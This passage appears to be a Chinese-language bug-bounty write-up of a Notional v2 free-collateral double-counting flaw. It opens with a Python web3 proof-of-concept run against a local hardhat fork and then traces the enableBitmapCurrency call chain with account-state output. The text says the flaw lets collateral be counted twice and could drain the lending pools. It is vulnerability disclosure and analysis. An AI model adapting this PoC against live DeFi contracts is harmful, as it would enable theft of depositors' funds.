@@ -1,0 +1,203 @@
+
+```python
+from web3 import Web3
+from Constant import Abi
+import binascii
+class Poc:
+def __init__(self):
+self.web3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))
+#self.web3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/yourkey"))
+self.NationalAbi = Abi.NationalAbi
+#self.addr = '0xdE14D5F07456c86F070C108A04Ae2fafdbD2A939'
+self.addr = "0x1344A36A1B56144C3Bc62E7757377D288fDE0369"
+self.uni_router = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"
+self.cdai_address = "0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643"
+self.dai_address = "0x6B175474E89094C44Da98b954EedeAC495271d0F"
+self.uniswap_router_abi = Abi.UniswapRouter2
+self.cdai_abi = Abi.CDaiAbi
+self.dai_abi = Abi.DaiAbi
+self.contract = self.web3.eth.contract(address=self.addr, abi=self.NationalAbi)
+self.uniswapRouter =self.web3.eth.contract(address=self.uni_router,abi=self.uniswap_router_abi)
+self.cdai_token = self.web3.eth.contract(address=self.cdai_address,abi=self.cdai_abi)
+self.dai_token = self.web3.eth.contract(address=self.dai_address,abi=self.dai_abi)
+self.privatekey = "your privatekey"
+self.account = self.web3.eth.account.from_key(self.privatekey)
+self.txParams = {
+'chainId': 31337, #hardhat chianid
+'nonce': self.web3.eth.getTransactionCount(self.account.address),
+'gas': 2000000,
+'from': self.account.address,
+# 'value': Web3.toWei(0, 'ether'),
+'gasPrice': self.web3.eth.gasPrice,
+}
+def get_free_collateral(self, address):
+'''
+获取
+:param address:
+:return:
+'''
+result = self.contract.functions.getFreeCollateral(address).call()
+print(result)
+def enable_bitmapCurrency(self, currencyid):
+'''
+开启bitmapCurrency
+:return:
+'''
+tx = self.contract.functions.enableBitmapCurrency(currencyid).buildTransaction(self.txParams)
+signed_txn = self.web3.eth.account.signTransaction(tx, private_key=self.privatekey) # 账号交易签名
+res = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction).hex() # 发送原始签名
+print(res)
+txn_receipt = self.web3.eth.wait_for_transaction_receipt(res) # 接受交易结果，并返回交易结果
+print(txn_receipt)
+return txn_receipt
+# signed = self.account.signTransaction(tx) # 用账户对交易签名
+# tx_id = self.web3.eth.sendRawTransaction(signed.rawTransaction) # 交易发送并获取交易id
+# tx_hash = self.contract.functions.enableBitmapCurrency(currencyid).transact()
+# result = self.web3.eth.wait_for_transaction_receipt(tx_hash)
+# print(result)
+def swap_eth_for_exact_tokens(self,amountout,ethnum,path,to,deadline):
+'''
+兑换Token
+:return:
+'''
+self.txParams.update({"value":Web3.toWei(ethnum, "ether")})
+tx = self.uniswapRouter.functions.swapETHForExactTokens(amountout, path, to, deadline).buildTransaction(self.txParams)
+result = self.sign_and_sendtx(tx)
+print(result)
+# signed_txn = self.web3.eth.account.signTransaction(tx, private_key=self.privatekey) # 账号交易签名
+# res = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction).hex() # 发送原始签名
+# print(res)
+# txn_receipt = self.web3.eth.wait_for_transaction_receipt(res) # 接受交易结果，并返回交易结果
+# print(txn_receipt)
+def sign_and_sendtx(self,tx):
+'''
+验签和的发送交易
+:param tx:
+:return:
+'''
+signed_txn = self.web3.eth.account.signTransaction(tx, private_key=self.privatekey) # 账号交易签名
+res = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction).hex() # 发送原始签名
+txn_receipt = self.web3.eth.wait_for_transaction_receipt(res) # 接受交易结果，并返回交易结果
+return txn_receipt
+def get_all_functions(self,addr,abi):
+'''
+获取所有方法
+:return:
+'''
+funcs = self.web3.eth.contract(address=addr, abi=abi)
+for func in funcs.all_functions():
+print(func)
+def get_account_context(self, address):
+'''
+获取账户上下文
+:param address:
+:return:
+'''
+result = self.contract.functions.getAccountContext(address).call()
+print(result)
+print("nextSettleTime:"+str(result[0]))
+print("hasDebt:" + str(binascii.b2a_hex(result[1])))
+print("assetArrayLength:" + str(result[2]))
+print("bitmapCurrencyId:" + str(result[3]))
+print("activeCurrencies:" + str(binascii.b2a_hex(result[4])))
+def get_currencyid(self, address):
+result = self.contract.functions.getCurrencyId(address).call()
+print(result)
+def deposit_underlying_token(self,account,currencyId,amountExternalPrecision):
+'''
+充值
+:param account:
+:param currencyId:
+:param amountExternalPrecision:
+:return:
+'''
+self.txParams.update({"value": Web3.toWei(1, "ether")})
+tx = self.contract.functions.depositUnderlyingToken(account, currencyId, amountExternalPrecision).buildTransaction(
+self.txParams)
+result = self.sign_and_sendtx(tx)
+print(result)
+def allowance_dai(self):
+'''
+:param address:
+:return:
+'''
+result = self.cdai_token.functions.allowance(self.account.address,self.addr).call()
+print(result)
+def approve_cdai(self):
+'''
+:param address:
+:return:
+'''
+tx = self.cdai_token.functions.approve(self.addr, 0xffffffff).buildTransaction(
+self.txParams)
+result = self.sign_and_sendtx(tx)
+print(result)
+def approve_dai(self):
+# tx = self.dai_token.functions.approve(self.addr, 0xffffffff).buildTransaction(
+# self.txParams)
+# result = self.sign_and_sendtx(tx)
+# print(result)
+tx = self.dai_token.functions.approve(self.addr, 1000000000000000000000000000).buildTransaction(
+self.txParams)
+result = self.sign_and_sendtx(tx)
+print(result)
+def get_account(self,address):
+'''
+获取账户信息
+:param address:
+:return:
+'''
+result = self.contract.functions.getAccount(Web3.toChecksumAddress(address)).call()
+print(result)
+def start(self):
+'''
+start test
+:return:
+'''
+cdai = "0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643" #8
+ceth = "0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5"
+# 兑换dai
+# amountout = 4000 * 10 ** 18
+# path = ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","0x6B175474E89094C44Da98b954EedeAC495271d0F"]
+# to = self.account.address
+# deadline = 0xffffffff
+# self.swap_eth_for_exact_tokens(amountout,2,path,to,deadline)
+#self.get_free_collateral(self.account.address)
+# 设置
+#self.enable_bitmapCurrency(1)
+# self.get_free_collateral(Web3.toChecksumAddress("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266"))
+# self.get_account_context(Web3.toChecksumAddress("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266"))
+# self.get_account("0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266")
+#self.enable_bitmapCurrency(2)
+#self.get_currencyid(Web3.toChecksumAddress("0x5d3a536e4d6dbd6114cc1ead35777bab948e3643"))
+# self.get_currencyid(Web3.toChecksumAddress("0x6b175474e89094c44da98b954eedeac495271d0f"))
+# self.approve_dai()
+# self.approve_dai_cdai()
+#self.deposit_underlying_token(self.account.address,160,1000000000000000000)
+if __name__ == "__main__":
+Poc().start()
+```
+
+## 漏洞描述
+
+[Notional](https://bbs.kanxue.com/elink@eddK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6F1L8%4c8A6L8$3&6S2L8q4)9J5k6h3k6A6L8X3q4F1j5$3g2Q4x3V1k6H3L8%4u0@1k6X3!0D9K9h3!0Q4x3V1j5`.) 简单说来就是一个固定周期，固定利率的借贷池，主要支持`Borrow`、`lend`以及`Provide Liquidity`的功能。在`notional v2`中有一个`free collateral`的概念，根据你的`free collateral`的计算的值可以借贷出相应价值的代币，而这个漏洞就是在`free collateral`的计算上出现了问题，导致可以双重计数，从而能够以较低的抵押贷出比抵押价值要多的代币出来，利用该漏洞可以掏空整个LP中的所有资金。
+
+**漏洞类型：逻辑**
+
+**难度：中等**
+
+**赏金：100万刀**
+
+## 漏洞分析
+
+1. 通过分析复现，发现本次漏洞的成因非常简单，就是在用户账户关键参数的读写上存在逻辑问题，导致能够双重计数。废话不多说，顺着调用链分析，首先是调用了`enableBitmapCurrency()` 来将用户的`accountContext.bitmapCurrencyId = currencyId;`设置为`currencyId`。
+
+![](https://bbs.kanxue.com/upload/attach/202202/811277_BWFPK6EME36PNCC.png)
+
+先看看调用前`getAccount()`的值：（`getAccount()`返回的是一个数据结构体，可以跟进分析数据结构）
+
+`(0, b'\x00', 0, 0, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [(0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []`
+
+接下来调用`enableBitmapCurrency(1)`，将`currencyId =1` 的代币设置为`bitmapCurrencyId`后：
+
+`(1641427200, b'\x00', 0, **1**, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), [**(1, 0, 0, 0, 0)**, (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0), (0, 0, 0, 0, 0)], []`
